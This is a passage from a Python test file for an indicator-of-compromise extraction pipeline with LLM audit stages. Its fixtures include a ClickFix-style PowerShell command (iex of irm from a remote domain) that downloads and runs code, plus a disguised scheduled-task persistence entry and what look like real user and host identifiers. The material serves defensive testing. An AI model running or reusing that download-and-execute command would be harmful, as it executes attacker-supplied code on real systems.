        self.assertEqual(count_candidates(payload), 2)

    def test_missing_sid_is_null_not_invented(self):
        extractor = self.extractor_module.RegexIOCExtractor()

        extraction = extractor.extract("User: DFollacchio")

        self.assertEqual(
            extraction['extraction_summary']['affected_users'],
            [{'username': 'DFollacchio', 'sid': None}],
        )

    def test_deterministic_sha256_extraction_does_not_require_semantic_inference(self):
        extraction = self.extractor_module.run_deterministic_ioc_extraction(
            "sha256: ff4ebff39f3a6e04e8da235b9e23e8d90b650f951becf71066b62792288e823c"
        )

        self.assertIn(
            {'value': 'ff4ebff39f3a6e04e8da235b9e23e8d90b650f951becf71066b62792288e823c', 'type': 'sha256', 'context': ''},
            extraction['iocs']['hashes'],
        )

    def test_defanged_domain_preserves_raw_and_normalized_values(self):
        extractor = self.extractor_module.RegexIOCExtractor()

        extraction = extractor.extract("Network evidence: frptoolsdownload[.]com")
        domain = extraction['iocs']['domains'][0]

        self.assertEqual(domain['raw_value'], 'frptoolsdownload[.]com')
        self.assertEqual(domain['normalized_value'], 'frptoolsdownload.com')
        self.assertEqual(domain['value'], 'frptoolsdownload.com')

    def test_huntress_platform_urls_are_not_network_iocs(self):
        extractor = self.extractor_module.RegexIOCExtractor()
        report = (
            "Portal: https://huntress.io/cases/123\n"
            "Remediation: https://app.huntress.io/case-management/abc\n"
            "C2: hxxps://frptoolsdownload[.]com/samfw-tool/\n"
        )

        extraction = extractor.extract(report)
        urls = [item['value'] for item in extraction['iocs']['urls']]

        self.assertEqual(urls, ['https://frptoolsdownload.com/samfw-tool/'])

    def test_semantic_reviewer_cannot_delete_partial_scheduled_task_without_source(self):
        prepare_payload = self.extractor_module._prepare_ai_extraction_payload
        review_calls = []
        original_review = self.extractor_module._ai_review.review_structured_output

        def fake_review(provider, **kwargs):
            review_calls.append(kwargs)
            return self.extractor_module._ioc_contract.build_empty_ioc_extraction()

        payload = self.extractor_module._ioc_contract.build_empty_ioc_extraction()
        payload['process_iocs']['scheduled_tasks'] = [
            {'name': 'UpdateService', 'path': None, 'command': None, 'evidence': 'Delete Scheduled Task - name: UpdateService'}
        ]

        self.extractor_module._ai_review.review_structured_output = fake_review
        try:
            prepared, meta = prepare_payload(
                provider=object(),
                payload=payload,
                max_tokens=2000,
                task_name='semantic_process_relationships',
            )
        finally:
            self.extractor_module._ai_review.review_structured_output = original_review

        self.assertFalse(review_calls)
        self.assertFalse(meta['review_applied'])
        self.assertEqual(prepared['process_iocs']['scheduled_tasks'][0]['name'], 'UpdateService')

    def test_llm_verifier_without_source_is_not_invoked_for_semantic_task(self):
        prepare_payload = self.extractor_module._prepare_ai_extraction_payload
        payload = {'unexpected': ['field']}

        prepared, meta = prepare_payload(
            provider=object(),
            payload=payload,
            max_tokens=2000,
            task_name='semantic_process_relationships',
        )

        self.assertEqual(meta['review_skipped_reason'], 'semantic_task_requires_source_evidence')
        self.assertTrue(self.extractor_module._is_valid_ioc_schema(prepared))

    def test_duplicate_ioc_records_preserve_multiple_evidence_sources(self):
        records_from_extraction = self.extractor_module._ioc_schema.records_from_extraction
        merge_records = self.extractor_module._ioc_merge.merge_record_lists
        hash_value = 'ff4ebff39f3a6e04e8da235b9e23e8d90b650f951becf71066b62792288e823c'

        first = records_from_extraction(
            {'iocs': {'hashes': [{'value': hash_value, 'type': 'sha256', 'evidence': 'Investigative summary hash'}]}, 'extraction_summary': {}},
            source='regex',
            trust_tier=self.extractor_module._ioc_schema.TRUST_HIGH,
        )
        second = records_from_extraction(
            {'iocs': {'hashes': [{'value': hash_value, 'type': 'sha256', 'evidence': 'Remediation list hash'}]}, 'extraction_summary': {}},
            source='regex',
            trust_tier=self.extractor_module._ioc_schema.TRUST_HIGH,
        )

        merged = merge_records(first, second)

        self.assertEqual(len(merged), 1)
        self.assertEqual(len(merged[0]['evidence_refs']), 2)

    def test_audit_delta_validation_enforces_traceable_closed_enum_values(self):
        validate_delta = self.extractor_module._audit_stage.validate_audit_delta
        chunk_text = (
            "Chunk text:\n"
            "Observed domain evil.example and service BootstrapSvc.\n"
        )
        candidates = [
            {'type': 'domain', 'value': 'evil.example', 'field': 'iocs.domains', 'context': ''},
            {'type': 'service', 'value': 'BootstrapSvc', 'field': 'iocs.services', 'context': ''},
        ]
        payload = {
            'additions': [
                {'chunk_id': 'chunk-01', 'type': 'domain', 'value': 'evil.example', 'context': 'Observed domain'},
                {'chunk_id': 'chunk-01', 'type': 'made_up_type', 'value': 'nope.example', 'context': ''},
            ],
            'corrections': [
                {
                    'chunk_id': 'chunk-01',
                    'type': 'service',
                    'original_value': 'BootstrapSvc',
                    'corrected_value': 'BootstrapSvc',
                    'reason': 'normalization_fix',
                }
            ],
            'drops': [
                {'chunk_id': 'chunk-01', 'type': 'domain', 'value': 'missing.example', 'reason': 'not_an_ioc'},
            ],
        }

        validated, meta = validate_delta(
            payload,
            chunk_id='chunk-01',
            chunk_text=chunk_text,
            chunk_candidates=candidates,
        )

        self.assertEqual(len(validated['additions']), 1)
        self.assertEqual(validated['additions'][0]['value'], 'evil.example')
        self.assertEqual(len(validated['corrections']), 1)
        self.assertEqual(validated['corrections'][0]['type'], 'service')
        self.assertEqual(validated['drops'], [])
        self.assertGreaterEqual(len(meta['rejected']), 2)

    def test_run_ioc_pipeline_with_provider_uses_audit_mode(self):
        original_audit_runner = self.extractor_module._audit_stage.run_audit_stage
        original_deterministic_runner = self.extractor_module.run_deterministic_ioc_extraction

        class FakeProvider:
            model = 'fake-audit-model'

            @staticmethod
            def get_batch_config():
                return {'context_window': 16384, 'max_tokens': 4000}

        def fake_deterministic_stage(_report_text, **_kwargs):
            return {
                'iocs': {
                    'domains': [{'value': 'deterministic.example', 'context': 'regex match'}],
                },
                'raw_artifacts': {},
                'extraction_summary': {'method': 'regex_only'},
                '_ioc_records': [],
            }

        def fake_audit_stage(_provider, _report_text, deterministic_extraction, **_kwargs):
            audited = {
                'extraction_summary': dict(deterministic_extraction.get('extraction_summary', {})),
                'iocs': dict(deterministic_extraction.get('iocs', {})),
                'raw_artifacts': dict(deterministic_extraction.get('raw_artifacts', {})),
            }
            audited['iocs']['domains'] = [{'value': 'audit-added.example', 'context': 'audit addition'}]
            return {
                'audited_extraction': audited,
                'validated_deltas': [
                    {
                        'additions': [
                            {
                                'chunk_id': 'chunk-01',
                                'type': 'domain',
                                'value': 'audit-added.example',
                                'context': 'audit addition',
                            }
                        ],
                        'corrections': [],
                        'drops': [],
                    }
                ],
                'task_failures': [],
                'task_provenance': [{'chunk': 'chunk-01', 'sections': ['Overview']}],
                'planned_tasks': ['chunk-01'],
                'reviewed_chunks': 1,
                'candidate_count': 2,
                'rejected_delta_count': 0,
                'schema_reviews': 0,
            }

        self.extractor_module.run_deterministic_ioc_extraction = fake_deterministic_stage
        self.extractor_module._audit_stage.run_audit_stage = fake_audit_stage
        try:
            extraction, used_ai = self.extractor_module.run_ioc_pipeline_with_provider(
                'Domain: audit-added.example',
                FakeProvider(),
                pipeline_mode='audit',
                model_name='fake-audit-model',
            )
        finally:
            self.extractor_module.run_deterministic_ioc_extraction = original_deterministic_runner
            self.extractor_module._audit_stage.run_audit_stage = original_audit_runner

        self.assertTrue(used_ai)
        self.assertEqual(extraction['extraction_summary']['method'], 'deterministic_plus_audit')
        self.assertEqual(extraction['extraction_summary']['model'], 'fake-audit-model')
        self.assertEqual(extraction['extraction_summary']['audit_chunk_count'], 1)
        self.assertTrue(
            any(item['value'] == 'audit-added.example' for item in extraction['iocs']['domains'])
        )
        self.assertEqual(
            extraction['deterministic_extraction']['iocs']['domains'][0]['value'],
            'deterministic.example',
        )
        self.assertEqual(
            extraction['audit_overlay']['validated_deltas'][0]['additions'][0]['value'],
            'audit-added.example',
        )

    def test_process_extraction_for_import_preserves_audit_overlay_metadata(self):
        original_records_from_extraction = self.extractor_module._ioc_schema.records_from_extraction
        original_build_record_lookup = self.extractor_module._ioc_schema.build_record_lookup

        previous_models_ioc = sys.modules.get('models.ioc')
        previous_models_known_system = sys.modules.get('models.known_system')
        previous_models_known_user = sys.modules.get('models.known_user')
        previous_models_database = sys.modules.get('models.database')
        previous_utils_opencti = sys.modules.get('utils.opencti')

        fake_ioc_module = types.ModuleType('models.ioc')

        class FakeIOC:
            @staticmethod
            def find_by_value(value, ioc_type, case_id=None):
                return None

            @staticmethod
            def is_valid_value(value, ioc_type):
                return True

        fake_ioc_module.IOC = FakeIOC
        fake_ioc_module.detect_match_type = lambda value, ioc_type: 'exact'
        fake_ioc_module.get_match_type_recommendation = lambda value, ioc_type: {'match_type': 'exact'}
        fake_ioc_module.get_category_for_type = lambda _ioc_type: 'Network'

        fake_known_system_module = types.ModuleType('models.known_system')
        fake_known_system_module.KnownSystem = type(
            'FakeKnownSystem',
            (),
            {'find_by_hostname_or_alias': staticmethod(lambda hostname, case_id=None: (None, None))},
        )

        fake_known_user_module = types.ModuleType('models.known_user')
        fake_known_user_module.KnownUser = type(
            'FakeKnownUser',
            (),
            {'find_by_username_sid_alias_or_email': staticmethod(lambda username=None, sid=None, case_id=None: (None, None))},
        )

        fake_database_module = types.ModuleType('models.database')
        fake_database_module.db = object()

        fake_opencti_module = types.ModuleType('utils.opencti')
        fake_opencti_module.maybe_auto_enrich_iocs = lambda iocs: {}

        self.extractor_module._ioc_schema.records_from_extraction = lambda *args, **kwargs: []
        self.extractor_module._ioc_schema.build_record_lookup = lambda _records: {}

        sys.modules['models.ioc'] = fake_ioc_module
        sys.modules['models.known_system'] = fake_known_system_module
        sys.modules['models.known_user'] = fake_known_user_module
        sys.modules['models.database'] = fake_database_module
        sys.modules['utils.opencti'] = fake_opencti_module

        try:
            processed = self.extractor_module.process_extraction_for_import(
                extraction={
                    'iocs': {'domains': [{'value': 'audit-added.example', 'context': 'audit addition'}]},
                    'raw_artifacts': {},
                    'extraction_summary': {'method': 'deterministic_plus_audit'},
                    'deterministic_extraction': {
                        'iocs': {'domains': [{'value': 'deterministic.example', 'context': 'regex match'}]},
                        'raw_artifacts': {},
                        'extraction_summary': {'method': 'regex_only'},
                    },
                    'audit_overlay': {
                        'validated_deltas': [{'additions': [{'value': 'audit-added.example'}], 'corrections': [], 'drops': []}],
                    },
                    '_ioc_records': [],
                },
                case_id=42,
                username='tester',
            )
        finally:
            self.extractor_module._ioc_schema.records_from_extraction = original_records_from_extraction
            self.extractor_module._ioc_schema.build_record_lookup = original_build_record_lookup
            if previous_models_ioc is not None:
                sys.modules['models.ioc'] = previous_models_ioc
            else:
                sys.modules.pop('models.ioc', None)
            if previous_models_known_system is not None:
                sys.modules['models.known_system'] = previous_models_known_system
            else:
                sys.modules.pop('models.known_system', None)
            if previous_models_known_user is not None:
                sys.modules['models.known_user'] = previous_models_known_user
            else:
                sys.modules.pop('models.known_user', None)
            if previous_models_database is not None:
                sys.modules['models.database'] = previous_models_database
            else:
                sys.modules.pop('models.database', None)
            if previous_utils_opencti is not None:
                sys.modules['utils.opencti'] = previous_utils_opencti
            else:
                sys.modules.pop('utils.opencti', None)

        self.assertEqual(
            processed['deterministic_extraction']['iocs']['domains'][0]['value'],
            'deterministic.example',
        )
        self.assertEqual(
            processed['audit_overlay']['validated_deltas'][0]['additions'][0]['value'],
            'audit-added.example',
        )

    def _clickfix_report_variants(self):
        command = (
            '"C:\\windows\\system32\\WindowsPowerShell\\v1.0\\PowerShell.exe" -c '
            '"iex(irm xkclcvlfophks.karburatorotzhigi.com/s/psc4/pr?cl -UseBasicParsing)"'
        )
        task_path = (
            'C:\\Users\\CPalmero\\AppData\\Local\\Microsoft\\WindowsApps\\'
            'Microsoft.PythonApp_mlzxcs7w1yl1c\\pythonw.exe'
        )
        return {
            'huntress': (
                "Portal: https://huntress.io/org/105204/infection_reports/2356636\n\n"
                "Lead Signal Information\n-----------------------\n"
                "Host: ATN86573\n"
                "User Account: ACMATCORP\\CPalmero\n"
                "SID: S-1-5-21-506201442-1415125562-945835055-3369\n"
                "Command Line: " + command + "\n"
                "Parent Process: explorer.exe\n\n"
                "Persistence\n-----------\n"
                "Type: Windows Scheduled Task\n"
                "Name: IntelSoftwareUpdater\n"
                "Service Path: " + task_path + "\n"
                "Parameters: run.pyw\n"
                "Domain: xkclcvlfophks.karburatorotzhigi.com\n"
            ),
            'generic_narrative': (
                "Incident Summary\n----------------\n"
                "User ACMATCORP\\CPalmero on host ATN86573 has SID "
                "S-1-5-21-506201442-1415125562-945835055-3369.\n\n"
                "Process Evidence\n----------------\n"
                "Command Line: " + command + "\n"
                "Parent Process: explorer.exe\n"
                "User: ACMATCORP\\CPalmero\n\n"
                "Scheduled Task\n--------------\n"
                "Scheduled Task: IntelSoftwareUpdater\n"
                "Executable: " + task_path + "\n"
                "Script: run.pyw\n"
                "Domain: xkclcvlfophks.karburatorotzhigi.com\n"
            ),
            'alternative_vendor_style': (
                "Detection Details\n-----------------\n"
                "Endpoint: ATN86573\n"
                "Actor User: ACMATCORP\\CPalmero\n"
                "SID: S-1-5-21-506201442-1415125562-945835055-3369\n\n"
                "Process Tree\n------------\n"
                "Command: " + command + "\n"
                "Parent Process: explorer.exe\n\n"
                "Network Indicators\n------------------\n"
                "Domain: xkclcvlfophks.karburatorotzhigi.com\n\n"
                "Persistence\n-----------\n"
                "Scheduled Task: IntelSoftwareUpdater\n"
                "Task executable: " + task_path + "\n"
                "Task script: run.pyw\n"
            ),
            'generic_unstructured': (
                "A SOC note reported the following without vendor headings.\n"
                "Host: ATN86573\n"
                "User Account: ACMATCORP\\CPalmero\n"
                "SID: S-1-5-21-506201442-1415125562-945835055-3369\n"
                "Command Line: " + command + "\n"
                "Parent Process: explorer.exe\n"
                "Scheduled Task: IntelSoftwareUpdater\n"
                "The task used " + task_path + " to run run.pyw and reached xkclcvlfophks.karburatorotzhigi.com."
            ),
        }

    def test_source_adapters_normalize_clickfix_reports_without_vendor_specific_ioc_shape(self):
        normalizer = self.extractor_module._report_normalizer
        variants = self._clickfix_report_variants()

        expected_domain = 'xkclcvlfophks.karburatorotzhigi.com'
        for name, report in variants.items():
            with self.subTest(source=name):
                canonical = normalizer.normalize_report_source(report)
                extraction = self.extractor_module.run_deterministic_ioc_extraction(report)
                task_names = [
                    task['task_name']
                    for task in self.extractor_module._semantic_stage.build_semantic_task_plan(
                        normalizer.render_canonical_report_text(canonical),
                        extraction,
                        canonical_report=canonical,
                    )
                ]

                self.assertIn(expected_domain, {item['value'] for item in extraction['iocs']['domains']})
                self.assertIn('ACMATCORP\\CPalmero', {
                    item['username']
                    for item in extraction['extraction_summary']['affected_users']
                })
                self.assertIn('S-1-5-21-506201442-1415125562-945835055-3369', extraction['iocs']['sids'])
                self.assertTrue(any(item.get('name') == 'IntelSoftwareUpdater' for item in extraction['iocs']['scheduled_tasks']))
                self.assertIn('semantic_identity_and_auth', task_names)
                self.assertIn('semantic_process_relationships', task_names)
                self.assertNotIn('huntress_iocs', extraction)
                self.assertNotIn('sentinelone_iocs', extraction)

    def test_generic_fallback_preserves_unrecognized_report_and_still_routes_evidence(self):
        normalizer = self.extractor_module._report_normalizer
        report = (
            "Bespoke analyst memo: user ACMATCORP\\CPalmero on ATN86573 launched "
            "PowerShell from Explorer. Command Line: powershell.exe -c irm xkclcvlfophks.karburatorotzhigi.com. "
            "Scheduled Task: IntelSoftwareUpdater."
        )

        canonical = normalizer.normalize_report_source(report)
        extraction = self.extractor_module.run_deterministic_ioc_extraction(report)
        tasks = self.extractor_module._semantic_stage.build_semantic_task_plan(
            normalizer.render_canonical_report_text(canonical),
            extraction,
            canonical_report=canonical,
        )

        self.assertEqual(canonical.source_type, 'generic')
        self.assertEqual(canonical.sections[0].source_section_name, 'Full Report')
        self.assertEqual(canonical.raw_text, report)
        self.assertTrue(any(item['value'] == 'xkclcvlfophks.karburatorotzhigi.com' for item in extraction['iocs']['domains']))
        self.assertIn('semantic_process_relationships', [task['task_name'] for task in tasks])

    def test_huntress_adapter_relabels_scheduled_task_service_path_without_creating_service(self):
        normalizer = self.extractor_module._report_normalizer
        report = (
            "Portal: https://huntress.io/org/105204/infection_reports/2356636\n\n"
            "Persistence\n-----------\n"
            "Type: Windows Scheduled Task\n"
            "Name: IntelSoftwareUpdater\n"
            "Service Path: C:\\Users\\CPalmero\\AppData\\Local\\Microsoft\\WindowsApps\\pythonw.exe\n"
            "Parameters: run.pyw\n"
        )

        canonical = normalizer.normalize_report_source(report)
        prepared = normalizer.render_canonical_report_text(canonical)
        extraction = self.extractor_module.run_deterministic_ioc_extraction(report)

        self.assertEqual(canonical.source_type, 'huntress')
        self.assertEqual(canonical.source_report_id, '2356636')
        self.assertIn('Scheduled Task Executable Path:', prepared)
        self.assertNotIn('Service Path:', prepared)
        self.assertTrue(any(item.get('name') == 'IntelSoftwareUpdater' for item in extraction['iocs']['scheduled_tasks']))
        self.assertEqual(extraction['iocs']['services'], [])

    def test_source_provenance_is_separate_from_extraction_method(self):
        report = (
            "Portal: https://huntress.io/org/105204/infection_reports/2356636\n"
            "Network\n-------\n"
            "Domain: xkclcvlfophks.karburatorotzhigi.com\n"
        )

        extraction = self.extractor_module.run_deterministic_ioc_extraction(report)
        record = next(
            item
            for item in extraction['_ioc_records']
            if item['ioc_type'] == 'Domain'
            and item['value'] == 'xkclcvlfophks.karburatorotzhigi.com'
        )

        self.assertEqual(record['source'], 'regex')
        self.assertEqual(record['extraction_method'], 'regex')
        self.assertEqual(record['evidence_source_type'], 'huntress')
        self.assertEqual(record['evidence_source_product'], 'Huntress')
        self.assertEqual(record['evidence_source_report_id'], '2356636')

    def test_generic_persistence_prose_alone_does_not_route_persistence_task(self):
        build_plan = self.extractor_module._semantic_stage.build_semantic_task_plan
        report = (
            "Overview\n--------\n"
            "Persistence is a common adversary objective, but this report only documents "
            "a scheduled task named IntelSoftwareUpdater launching powershell.exe.\n"
        )

        task_names = [task['task_name'] for task in build_plan(report, {'iocs': {}, 'extraction_summary': {}})]

        self.assertIn('semantic_process_relationships', task_names)
        self.assertNotIn('semantic_persistence_actions', task_names)


if __name__ == '__main__':
    unittest.main()
